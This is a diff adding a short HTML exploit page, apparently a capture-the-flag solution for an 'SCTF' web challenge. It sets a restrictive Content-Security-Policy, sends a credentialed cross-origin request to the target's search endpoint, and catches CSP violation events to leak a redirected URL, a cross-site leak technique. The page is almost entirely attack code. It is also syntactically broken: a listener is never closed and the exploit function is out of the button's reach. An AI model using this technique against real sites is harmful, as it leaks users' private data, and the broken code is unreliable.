@@ -1,0 +1,34 @@
+<html>
+  <head>
+  <title>TEST CSP</title>
+  </head>
+<script>
+  window.addEventListener('DOMContentLoaded', e => {
+      const meta = document.createElement('meta');
+      meta.httpEquiv = 'Content-Security-Policy';
+      meta.content = `default-src 'self' 'unsafe-inline' http://fuinjutsukeeper.tech`;
+      document.head.appendChild(meta);
+  
+function exploit() {
+        url = "http://fuinjutsukeeper.tech/search?query=SCTF"
+        const win = window.open((new URL(url)).origin , '_blank');
+        setTimeout(e => {
+          try{win.close()}
+          catch(e){}
+          finally{
+            fetch(url, {mode: 'no-cors', credentials: 'include'});
+          }
+        }, 5000);
+  
+  const HandleViolation = e => {
+        const document_uri = e.documentURI;
+        alert(document_uri);
+      }
+  
+  window.addEventListener('securitypolicyviolation', HandleViolation);
+}
+</script>
+  <body>
+  <button onclick="exploit()"></button>
+  </body>
+</html>
